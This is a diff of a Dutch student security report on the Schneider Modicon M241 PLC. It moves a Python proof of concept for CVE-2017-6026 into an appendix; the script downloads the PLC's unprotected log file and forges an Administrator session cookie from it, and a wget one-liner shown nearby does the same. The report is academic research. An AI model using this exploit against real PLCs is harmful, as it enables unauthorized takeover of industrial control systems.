@@ -12,6 +12,9 @@ Project door: Matti Bijnens, Remco Hofman, Stan van Wieringen
 | Lectoren          | Tijl Deneut, Hendrik Derre                      |
 | Academiejaar      | 2018-2019                                       |
 
+<!-- break -->
+<div style="page-break-after: always;"></div>
+
 ## Woord vooraf ##
 
 Voor ons security-project onderzoek kregen we de kans om met echte industriële hardware te werken. Meer specifiek hebben wij gewerkt met de Schneider Modicon M241 en de bijbehorende software. Dit verslag is het resultaat van ons onderzoek en bevindingen.
@@ -26,25 +29,35 @@ We hebben onderzoek gedaan naar vulnerabilities in de Schneider Modicon M241 sof
 
 Ook hebben wij met behulp van Wireshark de communicatie tussen de PLC en SoMachine onderschept en pogingen gedaan om het protocol te analyseren. We botsten tegen een muur toen we zagen dat we meerdere PLC's nodig hadden om hierin verder te geraken.
 
+<!-- break -->
+<div style="page-break-after: always;"></div>
+
 ## Inhoudsopgave ##
 
 <!-- toc -->
 
-- [Verklarende woordenlijst](#verklarende-woordenlijst)
-- [Intro](#intro)
-- [Verderzetting onderzoek vorig jaar](#verderzetting-onderzoek-vorig-jaar)
-- [Protocol](#protocol)
-  * [Ping command](#ping-command)
-  * [Discovery protocol](#discovery-protocol)
-  * [Start/stop command](#startstop-command)
-- [Decompile](#decompile)
-- [Action log](#action-log)
-- [Trello](#trello)
-- [Besluit](#besluit)
-- [Bronnen](#bronnen)
-- [Tools](#tools)
+- Verklarende woordenlijst
+- Intro
+- Verderzetting onderzoek vorig jaar
+- Protocol
+  - Schneider Protocol
+    - Ping command
+    - Discovery protocol
+    - Start/stop command
+  - modbus
+- Decompile
+- Action log
+- Trello
+- Besluit
+- Bronnen
+- Tools
+- Bijlagen
+  - CookieCruncher-reloaded
 
 <!-- tocstop -->
+
+<!-- break -->
+<div style="page-break-after: always;"></div>
 
 ## Verklarende woordenlijst ##
 
@@ -76,9 +89,12 @@ We hebben de Schneider Modicon 241 toegewezen gekregen en hebben de afgelopen ma
 
 ## Verderzetting onderzoek vorig jaar ##
 
-Vorig jaar werd een fout gevonden in de generatie van de cookie.
+Vorig jaar werd een fout gevonden in de generatie van de sessiecookie.
+In hun exploit werd gesteund op het feit dat via SNMP de opstarttijd van de PLC kon worden opgevraagd, echter hadden ze ze daar een tiental requests voor nodig omdat die tijd niet accuraat was.
 
-Als POC schreven we snel een shellscript om deze zwakte uit te buiten.
+Vroeg in het bekijken van de web-interface van de M241 ontdekten we dat de logfiles onbeschermd waren en dat hierin WEL het exacte tijdstip in stond.
+
+Als POC schreven we snel een kort shellscript om deze fout uit te buiten.
 
 ``` bash
 #!/bin/bash
@@ -93,57 +109,9 @@ $(wget -qO- ${1}/usr/Syslog/PlcLog.txt\
 | cut -d',' -f1)"
 ```
 
-Als uitbreiding schreven we ook een Python script om cross-platform te werken.
+Als uitbreiding schreven we ook een Python script om cross-platform te werken. U kan deze code vinden in de bijlagen, gezien de grotere omvang van deze file. Uiteraard is ze ook beschikbaar via github.
 
-``` python
-#!/usr/bin/python3
-import re
-import sys
-from urllib.request import urlretrieve
-import urllib.error
-
-
-def printhelp():
-    helpmsg = 'USAGE: {} HOST\n\n  Version: 0.1\n  About: A tool to help exploit CVE-2017-6026\n'.format(
-        sys.argv[0])
-    print(helpmsg)
-
-
-def findinterfaceregister(file: str = 'PlcLog.txt'):
-    last = ''
-    for line in open(file, 'r'):
-        if re.search('Network interface <interface>USB</interface> registered', line):
-            last = line
-    return last
-
-
-def getlogdate(line: str):
-    return line.split(',')[0]
-
-
-def buildcookie(t: str, user: str = 'Administrator'):
-    return '{}:{}'.format(user, t)
-
-
-def main():
-    try:
-        if sys.argv[1].lower() in ['-h', '--help']:
-            printhelp()
-            exit(1)
-        url = 'http://{}/usr/Syslog/PlcLog.txt'.format(sys.argv[1])
-    except (ValueError, IndexError):
-        printhelp()
-        exit(1)
-
-    urlretrieve(url, 'PlcLog.txt')
-    line = findinterfaceregister()
-    t = getlogdate(line)
-    print(buildcookie(t))
-
-
-if __name__ == '__main__':
-    main()
-```
+Kort na het schrijven van deze scripts is op exploitdb een exploit van onze lector, Tijl Deneut, uiteindelijk gepubliceerd. Ook zijn exploit maakt gebruik van de publiek leesbare logfiles om de sessiecookie te berekenen.
 
 ## Protocol ##
 
@@ -163,7 +131,7 @@ if __name__ == '__main__':
 
 ### modbus ###
 
-We found some weird behavior when sending modbus commands to the PLC. The device only executes modbus commands when in **STOP mode**.
+We found some weird behaviour when sending modbus commands to the PLC. The device only executes modbus commands when in **STOP mode**.
 We wrote a script that flashes the output leds one by one.
 
 ``` python
@@ -234,3 +202,57 @@ Webpagina. Ladder logic. Geraadpleegd op 6 november,
 ## Tools ##
 
 link tools hier
+
+## Bijlagen ##
+
+### CookieCruncher-reloaded ###
+
+``` python
+#!/usr/bin/python3
+import re
+import sys
+from urllib.request import urlretrieve
+import urllib.error
+
+
+def printhelp():
+    helpmsg = 'USAGE: {} HOST\n\n  Version: 0.1\n  About: A tool to help exploit CVE-2017-6026\n'.format(
+        sys.argv[0])
+    print(helpmsg)
+
+
+def findinterfaceregister(file: str = 'PlcLog.txt'):
+    last = ''
+    for line in open(file, 'r'):
+        if re.search('Network interface <interface>USB</interface> registered', line):
+            last = line
+    return last
+
+
+def getlogdate(line: str):
+    return line.split(',')[0]
+
+
+def buildcookie(t: str, user: str = 'Administrator'):
+    return '{}:{}'.format(user, t)
+
+
+def main():
+    try:
+        if sys.argv[1].lower() in ['-h', '--help']:
+            printhelp()
+            exit(1)
+        url = 'http://{}/usr/Syslog/PlcLog.txt'.format(sys.argv[1])
+    except (ValueError, IndexError):
+        printhelp()
+        exit(1)
+
+    urlretrieve(url, 'PlcLog.txt')
+    line = findinterfaceregister()
+    t = getlogdate(line)
+    print(buildcookie(t))
+
+
+if __name__ == '__main__':
+    main()
+```
